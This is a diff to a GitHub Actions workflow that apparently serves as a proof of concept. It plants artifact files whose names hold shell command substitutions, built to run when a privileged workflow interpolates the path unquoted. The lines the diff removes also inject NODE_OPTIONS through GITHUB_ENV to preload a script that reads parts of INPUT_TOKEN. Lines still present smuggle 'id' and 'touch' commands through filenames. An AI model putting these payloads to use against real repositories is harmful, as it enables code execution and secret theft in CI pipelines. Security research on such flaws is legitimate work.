@@ -12,13 +12,10 @@ jobs:
           mkdir -p /tmp/content
           echo "${{ github.event.number }}" > /tmp/content/pr_number.txt
           echo "benign test output" > /tmp/content/test.txt
-          # filename with command substitution: executes when the privileged
-          # workflow interpolates the artifact path into its shell step
+          # filename with command substitution: this path is later interpolated
+          # unquoted into a shell step of the privileged workflow
           touch '/tmp/content/$(id -un)z.txt'
-          # filename that exports NODE_OPTIONS for later JS-action steps
-          touch '/tmp/content/$(printf %s "NODE_OPTIONS=--require /tmp/content/content-default/pre.js" >> $GITHUB_ENV; echo z).txt'
-          printf '%s\n' 'try { const t = process.env.INPUT_TOKEN || ""; console.log("INPUT_TOKEN_LEN=" + t.length + " PREFIX=" + t.slice(0,4) + " REPO=" + process.env.GITHUB_REPOSITORY); } catch (e) { console.log("PRELOAD_ERR " + e.message); }' > /tmp/content/pre.js
-          ls -la /tmp/content
+          touch '/tmp/content/$(touch ${HOME}/rce_proof; echo z).txt'
       - uses: actions/upload-artifact@v4
         with:
           name: content-default
